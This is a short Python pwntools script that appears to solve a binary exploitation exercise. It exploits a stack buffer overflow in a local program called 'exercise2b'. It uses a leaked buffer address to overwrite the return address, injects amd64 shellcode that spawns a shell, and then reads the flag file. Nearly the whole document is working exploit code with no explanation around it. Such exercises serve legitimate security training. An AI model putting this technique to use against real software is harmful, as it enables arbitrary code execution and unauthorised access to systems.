#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
context.log_level = "critical"
exe = './exercise2b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def exploit():
    r = start()
    print(cyclic_find(0x63616165)) # 216
    shellc = asm(shellcraft.amd64.sh())
    buf_start_add = int(r.recvline().decode(), 16) + 3*8
    print(hex(buf_start_add))
    r.sendline(b"A"*16 + p64(buf_start_add) + shellc)
    r.sendline(b"cat flag")
    print(r.recvall(timeout=1).decode())

for i in range(20):
    try:
        exploit()
    except:
        pass